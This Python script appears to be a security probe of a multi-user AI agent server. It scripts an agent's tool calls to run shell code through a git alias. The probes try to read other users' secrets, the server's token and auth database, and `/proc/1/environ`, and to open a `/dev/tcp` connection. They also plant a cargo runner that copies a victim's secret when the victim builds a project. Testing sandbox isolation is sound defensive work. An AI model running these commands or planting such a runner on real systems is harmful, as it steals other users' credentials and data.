"""Row 70: one command in a user's session, in the image, trying what is not
theirs. Usage:

    python3 -I probe.py replies <probe>            # the scripted model's replies
    venv/bin/python -I probe.py run <email> <code> # logs in, runs it, prints it

The command is `git` or `cargo` (granted by deploy/luu.toml). `git`'s `!` alias
runs a shell — the way any granted program that runs others would — so what
the shell does is held by what the kernel holds the command to, nothing else.
The plan is the widest the policy allows: on a public server a user approves
their own plans, so the policy file is the bound, not the plan.
"""
import asyncio, json, sys, urllib.request

BASE = "127.0.0.1:7979"
ORIGIN = "http://127.0.0.1:7979"
import os
USERS = ["/work/" + u for u in os.environ.get("PROBE_USERS", "b0dbb68a973b 0c4b11d6ed03").split()]

HEAD = r"""
for d in %s; do case "$PWD" in "$d"*) ;; *) B=$d;; esac; done
t(){ n=$1; shift; o=$("$@" 2>&1); r=$?; printf '[%%s] %%s: %%s\n' "$r" "$n" "$(printf %%s "$o" | tr '\n' ' ' | cut -c1-240)"; }
t whoami id
t pwd pwd
t other-is echo "$B"
""" % " ".join(USERS)

PROBES = {
    # Everything the first run tried, under a plan that narrows nothing.
    "wide": HEAD + r"""
t own-write sh -c 'echo a > ./mine && cat ./mine'
t other-list ls -la "$B"
t other-read cat "$B/secret"
t other-write sh -c "echo x > $B/from-a-neighbour"
t other-symlink sh -c "ln -s $B ./to-neighbour && cat ./to-neighbour/secret"
t other-hardlink ln "$B/secret" ./neighbour-secret
t work-root-list ls /work
t state-list ls -la /state
t state-auth-db head -c 15 /state/auth.db
t state-token cat /state/token
t cargo-home-list ls -la /state/cargo
t cargo-home-write sh -c "echo from-$(basename $PWD) > /state/cargo/left-by-$(basename $PWD) && ls /state/cargo"
t cargo-home-exec sh -c "printf '#!/bin/sh\necho ran\n' > /state/cargo/x && chmod +x /state/cargo/x && /state/cargo/x"
t proc-1-environ sh -c "tr '\0' ' ' < /proc/1/environ"
t proc-list ls /proc
t signal-pid1 bash -c 'kill -0 1'
t tmp-write sh -c 'echo x > /tmp/was-here'
t net-tcp bash -c ': > /dev/tcp/172.17.0.2/1025'
""",
    # Ana leaves a cargo configuration where every user's cargo reads it: a
    # runner, which `cargo run` execs in place of the program it built.
    "plant": HEAD + r"""
t plant sh -c "printf '%s\n' '[target.x86_64-unknown-linux-gnu]' 'runner = [\"/state/cargo/runner\"]' > /state/cargo/config.toml && printf '%s\n' '#!/bin/sh' 'cat secret > /state/cargo/taken-from-\$(basename \$PWD)' 'exec \"\$@\"' > /state/cargo/runner && chmod +x /state/cargo/runner && cat /state/cargo/config.toml /state/cargo/runner"
""",
    # Bo runs his own project, the way he would any day.
    "victim": HEAD + r"""
t cargo-home-list ls -la /state/cargo
t cargo-run cargo run --offline --quiet --manifest-path hello/Cargo.toml
""",
    # Why a link fails in the image: the same build, its whole error kept.
    "link": HEAD + r"""
t env-tmp sh -c 'echo "TMPDIR=$TMPDIR"'
t cc-c sh -c "printf 'int main(void){return 0;}\n' > t.c && cc -c t.c -o t.o && echo compiled"
t cc-link sh -c "cc t.o -o t 2> cc.log; echo exit=\$?; tail -c 600 cc.log"
t cc-link-tmp sh -c "mkdir -p tmp && TMPDIR=\$PWD/tmp cc t.o -o t 2> cc2.log; echo exit=\$?; tail -c 400 cc2.log"
t cargo-build sh -c "cargo build --offline --manifest-path hello/Cargo.toml > build.log 2>&1; echo exit=\$?; tail -c 900 build.log"
""",
    # Ana reads what Bo's run left.
    "collect": HEAD + r"""
t cargo-home-list ls -la /state/cargo
t taken sh -c 'cat /state/cargo/taken-from-*'
""",
}


def plan(name):
    return ("```plan\n" + json.dumps({
        "objective": "probe", "steps": ["run it"], "files": [".", "/state/cargo"],
        "writes": [".", "/state/cargo"], "commands": ["git"]}) + "\n```")


def run_reply(name):
    script = "; ".join(l for l in PROBES[name].strip().splitlines() if l.strip())
    return ("Running it.\n```tool\n" + json.dumps({"name": "run_command", "arguments": {
        "argv": ["git", "-c", "alias.probe=!" + script, "probe"], "timeout_ms": 120000}})
            + "\n```")


def login(email, code):
    req = urllib.request.Request(f"http://{BASE}/api/auth/login", method="POST",
                                 data=json.dumps({"email": email, "code": code}).encode(),
                                 headers={"Content-Type": "application/json",
                                          "Origin": ORIGIN})
    with urllib.request.urlopen(req) as r:
        return r.headers["set-cookie"].split(";")[0]


async def run(email, code):
    import websockets
    cookie = login(email, code)
    async with websockets.connect(f"ws://{BASE}/ws", origin=ORIGIN,
                                  additional_headers={"Cookie": cookie},
                                  max_size=None) as ws:
        hello = json.loads(await ws.recv())
        await ws.send(json.dumps({"type": "hello", "protocol": hello["protocol"],
                                  "format": 27}))
        await ws.send(json.dumps({"type": "prompt", "text": "probe"}))
        held = []
        while True:
            m = json.loads(await asyncio.wait_for(ws.recv(), 180))
            kind = m.get("type")
            if kind == "token":
                continue
            print("<-", kind, json.dumps(m)[:300], file=sys.stderr)
            if kind == "refused":
                raise SystemExit(f"refused: {m}")
            if kind == "call_held":
                held.append(m)
                await ws.send(json.dumps({"type": "answer_call", "turn": m["turn"],
                                          "step": m["step"], "index": m.get("index"),
                                          "allow": True}))
            if kind == "plan_proposed":
                await ws.send(json.dumps({"type": "approve_plan"}))
                await ws.send(json.dumps({"type": "prompt", "text": "now"}))
            if kind == "tool_result":
                m["held"] = held
                return hello, m


if sys.argv[1] == "replies":
    name = sys.argv[2]
    print(json.dumps([plan(name), plan(name), run_reply(name), "Done."]))
else:
    hello, result = asyncio.run(run(sys.argv[2], sys.argv[3]))
    print(json.dumps({"session": hello.get("session"), "verdict": result.get("verdict"),
                      "held": result.get("held"), "command": result.get("command")}, indent=1))
